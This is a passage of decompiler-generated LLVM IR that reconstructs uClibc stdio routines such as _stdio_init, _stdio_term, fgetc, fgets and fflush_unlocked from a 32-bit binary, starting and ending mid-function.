  %v10_804bfaf = add i32 %v6_804bfaf, %v8_804bfab
  store i32 %v9_804bfaf, i32* %edi.global-to-local, align 4
  store i32 %v10_804bfaf, i32* %esi.global-to-local, align 4
  %v1_804bfb0 = inttoptr i32 %v10_804bfaf to i32*
  %v2_804bfb0 = load i32, i32* %v1_804bfb0, align 4
  %v4_804bfb0 = inttoptr i32 %v9_804bfaf to i32*
  store i32 %v2_804bfb0, i32* %v4_804bfb0, align 4
  %v2_804bfb1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bfb1, i32* @esi, align 4
  %v0_804bfb3 = load i32, i32* @eax, align 4
  ret i32 %v0_804bfb3
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804bfb4 = load i32, i32* @esi, align 4
  %v0_804bfb5 = load i32, i32* @ebx, align 4
  store i32 %v0_804bfb5, i32* %stack_var_-8, align 4
  %v1_804bfb6 = call i32 @__GI___errno_location(i32 %v0_804bfb5)
  store i32 %v1_804bfb6, i32* @ebx, align 4
  %v1_804bfbd = inttoptr i32 %v1_804bfb6 to i32*
  %v2_804bfbd = load i32, i32* %v1_804bfbd, align 4
  store i32 %v2_804bfbd, i32* @esi, align 4
  %v1_804bfc1 = call i32 @isatty(i32 0)
  %v1_804bfc7 = icmp eq i32 %v1_804bfc1, 0
  %v1_804bfc9 = icmp eq i1 %v1_804bfc7, false
  br i1 %v1_804bfc9, label %dec_label_pc_804bfd4, label %dec_label_pc_804bfcb

dec_label_pc_804bfcb:                             ; preds = %entry
  %v0_804bfcb = load i16, i16* @global_var_8053490.82, align 16
  %v1_804bfcb = xor i16 %v0_804bfcb, 256
  store i16 %v1_804bfcb, i16* @global_var_8053490.82, align 16
  br label %dec_label_pc_804bfd4

dec_label_pc_804bfd4:                             ; preds = %entry, %dec_label_pc_804bfcb
  %v1_804bfd6 = call i32 @isatty(i32 1)
  %v1_804bfdc = icmp eq i32 %v1_804bfd6, 0
  %v1_804bfde = icmp eq i1 %v1_804bfdc, false
  br i1 %v1_804bfde, label %dec_label_pc_804bfe9, label %dec_label_pc_804bfe0

dec_label_pc_804bfe0:                             ; preds = %dec_label_pc_804bfd4
  %v0_804bfe0 = load i16, i16* @global_var_80534e0.83, align 32
  %v1_804bfe0 = xor i16 %v0_804bfe0, 256
  store i16 %v1_804bfe0, i16* @global_var_80534e0.83, align 32
  br label %dec_label_pc_804bfe9

dec_label_pc_804bfe9:                             ; preds = %dec_label_pc_804bfd4, %dec_label_pc_804bfe0
  %v0_804bfe9 = load i32, i32* @esi, align 4
  %v1_804bfe9 = load i32, i32* @ebx, align 4
  %v2_804bfe9 = inttoptr i32 %v1_804bfe9 to i32*
  store i32 %v0_804bfe9, i32* %v2_804bfe9, align 4
  %v2_804bfeb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bfeb, i32* @ebx, align 4
  store i32 %v0_804bfb4, i32* @esi, align 4
  ret i32 %v1_804bfd6

; uselistorder directives
  uselistorder i16* @global_var_80534e0.83, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfe9, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd4, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bfee = load i32, i32* @esi, align 4
  %v0_804bfef = load i32, i32* @ebx, align 4
  store i32 %v0_804bfef, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_805345c.96 to i32), i32* %stack_var_-12, align 4
  %v2_804bff5 = call i32 @__stdio_init_mutex(i32* nonnull @global_var_805345c.96)
  store i32 %v2_804bff5, i32* @eax, align 4
  %v2_804bfff = call i32 @__stdio_init_mutex(i32* nonnull @global_var_8053474.92)
  %v0_804c004 = load i32, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  store i32 %v0_804c004, i32* %ebx.global-to-local, align 4
  %v1_804c04112 = icmp eq i32 %v0_804c004, 0
  %v1_804c04319 = icmp eq i1 %v1_804c04112, false
  br i1 %v1_804c04319, label %dec_label_pc_804c00e, label %dec_label_pc_804c05c.preheader

dec_label_pc_804c00e:                             ; preds = %entry, %dec_label_pc_804c030
  %v0_804c00e = phi i32 [ %v3_804c03d, %dec_label_pc_804c030 ], [ %v0_804c004, %entry ]
  %v1_804c00e = add i32 %v0_804c00e, 56
  store i32 %v1_804c00e, i32* @esi, align 4
  store i32 %v1_804c00e, i32* %stack_var_-12, align 4
  %v1_804c012 = call i32 @__pthread_return_0(i32 %v1_804c00e)
  store i32 %v1_804c012, i32* @eax, align 4
  %v1_804c018 = icmp eq i32 %v1_804c012, 0
  br i1 %v1_804c018, label %dec_label_pc_804c030, label %dec_label_pc_804c01c

dec_label_pc_804c01c:                             ; preds = %dec_label_pc_804c00e
  %v0_804c01c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c01c = inttoptr i32 %v0_804c01c to i16*
  store i16 48, i16* %v1_804c01c, align 2
  %v0_804c021 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c021 = add i32 %v0_804c021, 8
  %v2_804c021 = inttoptr i32 %v1_804c021 to i32*
  %v3_804c021 = load i32, i32* %v2_804c021, align 4
  store i32 %v3_804c021, i32* @eax, align 4
  %v2_804c024 = add i32 %v0_804c021, 24
  %v3_804c024 = inttoptr i32 %v2_804c024 to i32*
  store i32 %v3_804c021, i32* %v3_804c024, align 4
  %v0_804c027 = load i32, i32* @eax, align 4
  %v1_804c027 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c027 = add i32 %v1_804c027, 28
  %v3_804c027 = inttoptr i32 %v2_804c027 to i32*
  store i32 %v0_804c027, i32* %v3_804c027, align 4
  %v0_804c02a = load i32, i32* @eax, align 4
  %v1_804c02a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c02a = add i32 %v1_804c02a, 16
  %v3_804c02a = inttoptr i32 %v2_804c02a to i32*
  store i32 %v0_804c02a, i32* %v3_804c02a, align 4
  %v0_804c02d = load i32, i32* @eax, align 4
  %v1_804c02d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c02d = add i32 %v1_804c02d, 20
  %v3_804c02d = inttoptr i32 %v2_804c02d to i32*
  store i32 %v0_804c02d, i32* %v3_804c02d, align 4
  br label %dec_label_pc_804c030

dec_label_pc_804c030:                             ; preds = %dec_label_pc_804c00e, %dec_label_pc_804c01c
  %v0_804c030 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c030 = add i32 %v0_804c030, 52
  %v2_804c030 = inttoptr i32 %v1_804c030 to i32*
  store i32 1, i32* %v2_804c030, align 4
  %v0_804c037 = load i32, i32* @esi, align 4
  store i32 %v0_804c037, i32* %stack_var_-12, align 4
  %v1_804c038 = inttoptr i32 %v0_804c037 to i32*
  %v2_804c038 = call i32 @__stdio_init_mutex(i32* %v1_804c038)
  %v0_804c03d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c03d = add i32 %v0_804c03d, 32
  %v2_804c03d = inttoptr i32 %v1_804c03d to i32*
  %v3_804c03d = load i32, i32* %v2_804c03d, align 4
  store i32 %v3_804c03d, i32* %ebx.global-to-local, align 4
  %v1_804c041 = icmp eq i32 %v3_804c03d, 0
  %v1_804c043 = icmp eq i1 %v1_804c041, false
  br i1 %v1_804c043, label %dec_label_pc_804c00e, label %dec_label_pc_804c041.dec_label_pc_804c05c.preheader_crit_edge

dec_label_pc_804c041.dec_label_pc_804c05c.preheader_crit_edge: ; preds = %dec_label_pc_804c030
  %v2_804c040 = load i32, i32* %stack_var_-12, align 4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 4
  br label %dec_label_pc_804c05c.preheader

dec_label_pc_804c05c.preheader:                   ; preds = %dec_label_pc_804c041.dec_label_pc_804c05c.preheader_crit_edge, %entry
  %v0_804c06227 = phi i32 [ %v2_804c040, %dec_label_pc_804c041.dec_label_pc_804c05c.preheader_crit_edge ], [ %v2_804bfff, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804c041.dec_label_pc_804c05c.preheader_crit_edge ], [ %v0_804c004, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804c05c3 = icmp eq i32 %storemerge12, 0
  %v1_804c05e10 = icmp eq i1 %v1_804c05c3, false
  br i1 %v1_804c05e10, label %dec_label_pc_804c04d, label %dec_label_pc_804c060

dec_label_pc_804c04d:                             ; preds = %dec_label_pc_804c05c.preheader, %dec_label_pc_804c059
  %v0_804c06226 = phi i32 [ %v0_804c06225, %dec_label_pc_804c059 ], [ %v0_804c06227, %dec_label_pc_804c05c.preheader ]
  %v0_804c052 = phi i32 [ %storemerge1, %dec_label_pc_804c059 ], [ %storemerge12, %dec_label_pc_804c05c.preheader ]
  %v1_804c04d = inttoptr i32 %v0_804c052 to i8*
  %v2_804c04d = load i8, i8* %v1_804c04d, align 1
  %v3_804c04d = and i8 %v2_804c04d, 64
  %v4_804c04d = icmp eq i8 %v3_804c04d, 0
  br i1 %v4_804c04d, label %dec_label_pc_804c059, label %dec_label_pc_804c052

dec_label_pc_804c052:                             ; preds = %dec_label_pc_804c04d
  store i32 %v0_804c052, i32* %stack_var_-12, align 4
  %v1_804c053 = call i32 @__stdio_wcommit(i32 %v0_804c052)
  %v0_804c059.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c059

dec_label_pc_804c059:                             ; preds = %dec_label_pc_804c04d, %dec_label_pc_804c052
  %v0_804c06225 = phi i32 [ %v0_804c06226, %dec_label_pc_804c04d ], [ %v1_804c053, %dec_label_pc_804c052 ]
  %v0_804c059 = phi i32 [ %v0_804c052, %dec_label_pc_804c04d ], [ %v0_804c059.pre, %dec_label_pc_804c052 ]
  %v1_804c059 = add i32 %v0_804c059, 32
  %v2_804c059 = inttoptr i32 %v1_804c059 to i32*
  %storemerge1 = load i32, i32* %v2_804c059, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804c05c = icmp eq i32 %storemerge1, 0
  %v1_804c05e = icmp eq i1 %v1_804c05c, false
  br i1 %v1_804c05e, label %dec_label_pc_804c04d, label %dec_label_pc_804c060

dec_label_pc_804c060:                             ; preds = %dec_label_pc_804c059, %dec_label_pc_804c05c.preheader
  %v0_804c062 = phi i32 [ %v0_804c06227, %dec_label_pc_804c05c.preheader ], [ %v0_804c06225, %dec_label_pc_804c059 ]
  %v2_804c060 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c060, i32* @ebx, align 4
  store i32 %v0_804bfee, i32* @esi, align 4
  ret i32 %v0_804c062

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_804c052, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %v0_804c06227, { 1, 0 }
  uselistorder i32 %v3_804c03d, { 1, 2, 0 }
  uselistorder i32 %v0_804c004, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804c059, { 1, 0 }
  uselistorder label %dec_label_pc_804c04d, { 1, 0 }
  uselistorder label %dec_label_pc_804c030, { 1, 0 }
  uselistorder label %dec_label_pc_804c00e, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c064 = load i32, i32* @ebx, align 4
  store i32 %v0_804c064, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c069 = add i32 %arg1, 8
  %v2_804c069 = inttoptr i32 %v1_804c069 to i32*
  %v3_804c069 = load i32, i32* %v2_804c069, align 4
  store i32 %v3_804c069, i32* %edx.global-to-local, align 4
  %v1_804c06c = add i32 %arg1, 16
  %v2_804c06c = inttoptr i32 %v1_804c06c to i32*
  %v3_804c06c = load i32, i32* %v2_804c06c, align 4
  %v2_804c06f = sub i32 %v3_804c06c, %v3_804c069
  %v12_804c06f = icmp eq i32 %v2_804c06f, 0
  store i32 %v2_804c06f, i32* %eax.global-to-local, align 4
  br i1 %v12_804c06f, label %dec_label_pc_804c081, label %dec_label_pc_804c073

dec_label_pc_804c073:                             ; preds = %entry
  store i32 %v3_804c069, i32* %v2_804c06c, align 4
  %v0_804c076 = load i32, i32* %eax.global-to-local, align 4
  %v0_804c077 = load i32, i32* %edx.global-to-local, align 4
  %v0_804c078 = load i32, i32* @ebx, align 4
  %v3_804c079 = load i32, i32* %stack_var_-4, align 4
  %v4_804c079 = inttoptr i32 %v0_804c078 to i16*
  %v5_804c079 = call i32 @__stdio_WRITE(i16* %v4_804c079, i32 %v0_804c077, i32 %v0_804c076, i32 %v3_804c079)
  store i32 %v5_804c079, i32* %eax.global-to-local, align 4
  %v0_804c081.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c081

dec_label_pc_804c081:                             ; preds = %entry, %dec_label_pc_804c073
  %v2_804c087 = phi i32 [ %v0_804c064, %entry ], [ %v3_804c079, %dec_label_pc_804c073 ]
  %v0_804c081 = phi i32 [ %arg1, %entry ], [ %v0_804c081.pre, %dec_label_pc_804c073 ]
  %v1_804c081 = add i32 %v0_804c081, 16
  %v2_804c081 = inttoptr i32 %v1_804c081 to i32*
  %v3_804c081 = load i32, i32* %v2_804c081, align 4
  store i32 %v3_804c081, i32* %eax.global-to-local, align 4
  %v2_804c084 = add i32 %v0_804c081, 8
  %v3_804c084 = inttoptr i32 %v2_804c084 to i32*
  %v4_804c084 = load i32, i32* %v3_804c084, align 4
  %v5_804c084 = sub i32 %v3_804c081, %v4_804c084
  store i32 %v5_804c084, i32* %eax.global-to-local, align 4
  store i32 %v2_804c087, i32* @ebx, align 4
  ret i32 %v5_804c084

; uselistorder directives
  uselistorder i32 %v0_804c081, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c081, { 1, 0 }
}

define i32 @__GI_fgetc() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v0_804c08c = load i32, i32* @esi, align 4
  %v0_804c08d = load i32, i32* @ebx, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_804c095 = add i32 %tmp, 52
  %v2_804c095 = inttoptr i32 %v1_804c095 to i32*
  %v3_804c095 = load i32, i32* %v2_804c095, align 4
  %v4_804c095 = icmp eq i32 %v3_804c095, 0
  br i1 %v4_804c095, label %dec_label_pc_804c0b7, label %dec_label_pc_804c09b

dec_label_pc_804c09b:                             ; preds = %entry
  %v1_804c09b = add i32 %tmp, 16
  %v2_804c09b = inttoptr i32 %v1_804c09b to i32*
  %v3_804c09b = load i32, i32* %v2_804c09b, align 4
  %v2_804c09e = add i32 %tmp, 24
  %v3_804c09e = inttoptr i32 %v2_804c09e to i32*
  %v4_804c09e = load i32, i32* %v3_804c09e, align 4
  %v10_804c09e = icmp ult i32 %v3_804c09b, %v4_804c09e
  %v1_804c0a1 = icmp eq i1 %v10_804c09e, false
  br i1 %v1_804c0a1, label %dec_label_pc_804c0ac, label %dec_label_pc_804c0a3

dec_label_pc_804c0a3:                             ; preds = %dec_label_pc_804c09b
  %v1_804c0a3 = inttoptr i32 %v3_804c09b to i8*
  %v2_804c0a3 = load i8, i8* %v1_804c0a3, align 1
  %v3_804c0a3 = zext i8 %v2_804c0a3 to i32
  store i32 %v3_804c0a3, i32* %ebx.global-to-local, align 4
  %v1_804c0a6 = add i32 %v3_804c09b, 1
  store i32 %v1_804c0a6, i32* %v2_804c09b, align 4
  br label %dec_label_pc_804c0fb

dec_label_pc_804c0ac:                             ; preds = %dec_label_pc_804c09b
  %v1_804c0ad = inttoptr i32 %tmp to i16*
  %v2_804c0ad = call i32 @getc_unlocked(i16* %v1_804c0ad)
  store i32 %v2_804c0ad, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c0fb

dec_label_pc_804c0b7:                             ; preds = %entry
  %v1_804c0b7 = add i32 %tmp, 56
  store i32 %v1_804c0b7, i32* @ebx, align 4
  %v4_804c0c5 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 %v1_804c0b7)
  %v0_804c0ca = load i32, i32* @ebx, align 4
  %v1_804c0cb = call i32 @__pthread_return_0(i32 %v0_804c0ca)
  %v0_804c0d0 = load i32, i32* @esi, align 4
  %v1_804c0d0 = add i32 %v0_804c0d0, 16
  %v2_804c0d0 = inttoptr i32 %v1_804c0d0 to i32*
  %v3_804c0d0 = load i32, i32* %v2_804c0d0, align 4
  %v2_804c0d6 = add i32 %v0_804c0d0, 24
  %v3_804c0d6 = inttoptr i32 %v2_804c0d6 to i32*
  %v4_804c0d6 = load i32, i32* %v3_804c0d6, align 4
  %v10_804c0d6 = icmp ult i32 %v3_804c0d0, %v4_804c0d6
  %v1_804c0d9 = icmp eq i1 %v10_804c0d6, false
  br i1 %v1_804c0d9, label %dec_label_pc_804c0e4, label %dec_label_pc_804c0db

dec_label_pc_804c0db:                             ; preds = %dec_label_pc_804c0b7
  %v1_804c0db = inttoptr i32 %v3_804c0d0 to i8*
  %v2_804c0db = load i8, i8* %v1_804c0db, align 1
  %v3_804c0db = zext i8 %v2_804c0db to i32
  store i32 %v3_804c0db, i32* %ebx.global-to-local, align 4
  %v1_804c0de = add i32 %v3_804c0d0, 1
  store i32 %v1_804c0de, i32* %v2_804c0d0, align 4
  br label %dec_label_pc_804c0ed

dec_label_pc_804c0e4:                             ; preds = %dec_label_pc_804c0b7
  %v1_804c0e5 = inttoptr i32 %v0_804c0d0 to i16*
  %v2_804c0e5 = call i32 @getc_unlocked(i16* %v1_804c0e5)
  store i32 %v2_804c0e5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c0ed

dec_label_pc_804c0ed:                             ; preds = %dec_label_pc_804c0db, %dec_label_pc_804c0e4
  %v3_804c0f4 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  br label %dec_label_pc_804c0fb

dec_label_pc_804c0fb:                             ; preds = %dec_label_pc_804c0ac, %dec_label_pc_804c0a3, %dec_label_pc_804c0ed
  %v0_804c0fb = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c08d, i32* @ebx, align 4
  store i32 %v0_804c08c, i32* @esi, align 4
  ret i32 %v0_804c0fb

; uselistorder directives
  uselistorder i32 %v3_804c0d0, { 1, 0, 2 }
  uselistorder i32 %v3_804c09b, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804c0fb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c0ed, { 1, 0 }
}

define i32 @fgets() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_804c104 = load i32, i32* @edi, align 4
  %v0_804c105 = load i32, i32* @esi, align 4
  %v0_804c106 = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @esi, align 4
  %v1_804c10e = add i32 %tmp7, 52
  %v2_804c10e = inttoptr i32 %v1_804c10e to i32*
  %v3_804c10e = load i32, i32* %v2_804c10e, align 4
  %v4_804c10e = icmp eq i32 %v3_804c10e, 0
  %v1_804c112 = zext i1 %v4_804c10e to i32
  store i32 %v1_804c112, i32* @edi, align 4
  %v1_804c118 = icmp eq i1 %v4_804c10e, false
  br i1 %v1_804c118, label %entry.dec_label_pc_804c138_crit_edge, label %dec_label_pc_804c11c

entry.dec_label_pc_804c138_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804c138

dec_label_pc_804c11c:                             ; preds = %entry
  %v1_804c11c = add i32 %tmp7, 56
  store i32 %v1_804c11c, i32* @ebx, align 4
  %v4_804c12a = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134525440, i32 %v1_804c11c)
  %v0_804c12f = load i32, i32* @ebx, align 4
  %v1_804c130 = call i32 @__pthread_return_0(i32 %v0_804c12f)
  %v0_804c138.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c138

dec_label_pc_804c138:                             ; preds = %entry.dec_label_pc_804c138_crit_edge, %dec_label_pc_804c11c
  %v0_804c138 = phi i32 [ %tmp7, %entry.dec_label_pc_804c138_crit_edge ], [ %v0_804c138.pre, %dec_label_pc_804c11c ]
  %v3_804c141 = inttoptr i32 %tmp to i8*
  %v4_804c141 = call i32 @__GI_fgets_unlocked(i8* %v3_804c141, i32 %tmp6, i32 %v0_804c138)
  store i32 %v4_804c141, i32* %ebx.global-to-local, align 4
  br i1 %v1_804c118, label %dec_label_pc_804c15d, label %dec_label_pc_804c14f

dec_label_pc_804c14f:                             ; preds = %dec_label_pc_804c138
  %v3_804c156 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_804c15d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c15d

dec_label_pc_804c15d:                             ; preds = %dec_label_pc_804c138, %dec_label_pc_804c14f
  %v0_804c15d = phi i32 [ %v4_804c141, %dec_label_pc_804c138 ], [ %v0_804c15d.pre, %dec_label_pc_804c14f ]
  store i32 %v0_804c106, i32* @ebx, align 4
  store i32 %v0_804c105, i32* @esi, align 4
  store i32 %v0_804c104, i32* @edi, align 4
  ret i32 %v0_804c15d

; uselistorder directives
  uselistorder i1 %v4_804c10e, { 1, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c15d, { 1, 0 }
  uselistorder label %dec_label_pc_804c138, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v4_804c17c = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v1_804c186 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v0_804c18b = load i32, i32* @global_var_80537c8.93, align 8
  %v8_804c193 = icmp eq i32 %v0_804c18b, 1
  %v1_804c194 = icmp eq i1 %v8_804c193, false
  br i1 %v1_804c194, label %dec_label_pc_804c21c, label %dec_label_pc_804c19a

dec_label_pc_804c19a:                             ; preds = %entry
  %v0_804c19a = load i32, i32* @global_var_80537cc.94, align 4
  %tmp21 = icmp slt i32 %v0_804c19a, 1
  br i1 %tmp21, label %dec_label_pc_804c21c, label %dec_label_pc_804c1a3

dec_label_pc_804c1a3:                             ; preds = %dec_label_pc_804c19a
  %v4_804c1b2 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134525440, i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  %v1_804c1bc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  %v0_804c1c1 = load i32, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  store i32 %v0_804c1c1, i32* %edx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_804c2002 = icmp eq i32 %v0_804c1c1, 0
  %v1_804c2029 = icmp eq i1 %v1_804c2002, false
  br i1 %v1_804c2029, label %dec_label_pc_804c1ce, label %dec_label_pc_804c204

dec_label_pc_804c1ce:                             ; preds = %dec_label_pc_804c1a3, %dec_label_pc_804c1fe
  %v0_804c1de = phi i32 [ %v0_804c1fe, %dec_label_pc_804c1fe ], [ %v0_804c1c1, %dec_label_pc_804c1a3 ]
  %v1_804c1ce = add i32 %v0_804c1de, 32
  %v2_804c1ce = inttoptr i32 %v1_804c1ce to i32*
  %v3_804c1ce = load i32, i32* %v2_804c1ce, align 4
  store i32 %v3_804c1ce, i32* @ebx, align 4
  %v1_804c1d1 = inttoptr i32 %v0_804c1de to i16*
  %v2_804c1d1 = load i16, i16* %v1_804c1d1, align 2
  %v1_804c1d4 = and i16 %v2_804c1d1, -32720
  %v6_804c1d9 = icmp eq i16 %v1_804c1d4, 48
  br i1 %v6_804c1d9, label %dec_label_pc_804c1e2, label %dec_label_pc_804c1de

dec_label_pc_804c1de:                             ; preds = %dec_label_pc_804c1ce
  store i32 %v0_804c1de, i32* @esi, align 4
  br label %dec_label_pc_804c1fe

dec_label_pc_804c1e2:                             ; preds = %dec_label_pc_804c1ce
  %v0_804c1e2 = load i32, i32* @esi, align 4
  %v1_804c1e2 = icmp eq i32 %v0_804c1e2, 0
  %v1_804c1e4 = icmp eq i1 %v1_804c1e2, false
  br i1 %v1_804c1e4, label %dec_label_pc_804c1ee, label %dec_label_pc_804c1e6

dec_label_pc_804c1e6:                             ; preds = %dec_label_pc_804c1e2
  store i32 %v3_804c1ce, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  br label %dec_label_pc_804c1f1

dec_label_pc_804c1ee:                             ; preds = %dec_label_pc_804c1e2
  %v2_804c1ee = add i32 %v0_804c1e2, 32
  %v3_804c1ee = inttoptr i32 %v2_804c1ee to i32*
  store i32 %v3_804c1ce, i32* %v3_804c1ee, align 4
  %v0_804c1f1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c1f1

dec_label_pc_804c1f1:                             ; preds = %dec_label_pc_804c1e6, %dec_label_pc_804c1ee
  %v0_804c1f7 = phi i32 [ %v0_804c1de, %dec_label_pc_804c1e6 ], [ %v0_804c1f1.pre, %dec_label_pc_804c1ee ]
  %v1_804c1f1 = add i32 %v0_804c1f7, 1
  %v2_804c1f1 = inttoptr i32 %v1_804c1f1 to i8*
  %v3_804c1f1 = load i8, i8* %v2_804c1f1, align 1
  %v4_804c1f1 = and i8 %v3_804c1f1, 32
  %v5_804c1f1 = icmp eq i8 %v4_804c1f1, 0
  br i1 %v5_804c1f1, label %dec_label_pc_804c1fe, label %dec_label_pc_804c1f7

dec_label_pc_804c1f7:                             ; preds = %dec_label_pc_804c1f1
  %v1_804c1f8 = call i32 @free(i32 %v0_804c1f7)
  store i32 %v0_804c1f7, i32* @ecx, align 4
  br label %dec_label_pc_804c1fe

dec_label_pc_804c1fe:                             ; preds = %dec_label_pc_804c1f1, %dec_label_pc_804c1de, %dec_label_pc_804c1f7
  %v0_804c1fe = load i32, i32* @ebx, align 4
  store i32 %v0_804c1fe, i32* %edx.global-to-local, align 4
  %v1_804c200 = icmp eq i32 %v0_804c1fe, 0
  %v1_804c202 = icmp eq i1 %v1_804c200, false
  br i1 %v1_804c202, label %dec_label_pc_804c1ce, label %dec_label_pc_804c204.loopexit

dec_label_pc_804c204.loopexit:                    ; preds = %dec_label_pc_804c1fe
  br label %dec_label_pc_804c204

dec_label_pc_804c204:                             ; preds = %dec_label_pc_804c204.loopexit, %dec_label_pc_804c1a3
  %v3_804c20b = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_80537cc.94, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_804c21c.pre = load i32, i32* @global_var_80537c8.93, align 8
  br label %dec_label_pc_804c21c

dec_label_pc_804c21c:                             ; preds = %dec_label_pc_804c19a, %entry, %dec_label_pc_804c204
  %v0_804c21c = phi i32 [ %v0_804c18b, %dec_label_pc_804c19a ], [ %v0_804c18b, %entry ], [ %v0_804c21c.pre, %dec_label_pc_804c204 ]
  %v1_804c221 = add i32 %v0_804c21c, -1
  store i32 %v1_804c221, i32* @global_var_80537c8.93, align 8
  %v3_804c22e = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v3_804c22e

; uselistorder directives
  uselistorder i32 %v0_804c1fe, { 1, 2, 0 }
  uselistorder i32 %v0_804c1de, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804c18b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c21c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1f1, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ce, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804c239 = load i32, i32* @ebp, align 4
  %v0_804c23a = load i32, i32* @edi, align 4
  %v0_804c23b = load i32, i32* @esi, align 4
  %v0_804c23c = load i32, i32* @ebx, align 4
  %v4_804c240 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804c240, i32* @ebx, align 4
  %v10_804c24b = icmp eq i16* %arg1, inttoptr (i32 134558808 to i16*)
  br i1 %v10_804c24b, label %dec_label_pc_804c262, label %dec_label_pc_804c253

dec_label_pc_804c253:                             ; preds = %entry
  %v2_804c25a = icmp eq i16* %arg1, null
  %v1_804c25c = icmp eq i1 %v2_804c25a, false
  br i1 %v1_804c25c, label %dec_label_pc_804c328, label %dec_label_pc_804c262

dec_label_pc_804c262:                             ; preds = %dec_label_pc_804c253, %entry
  %stack_var_-34.0 = phi i32 [ 0, %entry ], [ 256, %dec_label_pc_804c253 ]
  %v2_804c26c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c26c, i32* @ebx, align 4
